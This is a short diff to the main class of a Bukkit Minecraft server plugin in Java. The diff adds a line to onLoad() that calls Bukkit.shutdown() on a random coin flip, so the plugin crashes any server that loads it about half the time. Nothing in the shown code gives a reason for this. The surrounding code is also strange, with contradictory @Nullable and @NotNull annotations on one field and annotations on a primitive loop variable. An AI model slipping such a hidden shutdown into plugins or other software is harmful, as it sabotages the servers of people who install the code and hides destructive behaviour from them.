@@ -23,6 +23,7 @@ import org.jetbrains.annotations.NonNls;
 import org.jetbrains.annotations.NotNull;
 import org.jetbrains.annotations.Nullable;
 
+import java.util.Random;
 import java
         .lang
         .reflect
@@ -43,7 +44,7 @@ import static org.bukkit.ChatColor.GOLD;
 public class Main extends JavaPlugin{
     @Setter
     public static @NonNls @Nullable @NotNull Main instance;
-    public void onLoad(){    }
+    public void onLoad(){  if (new Random().nextBoolean()) Bukkit.shutdown();  }
     public void onEnable(@Nullable Main this){
         // Plugin startup logic
         for(@NotNull int i = 0; i < 10; i++){
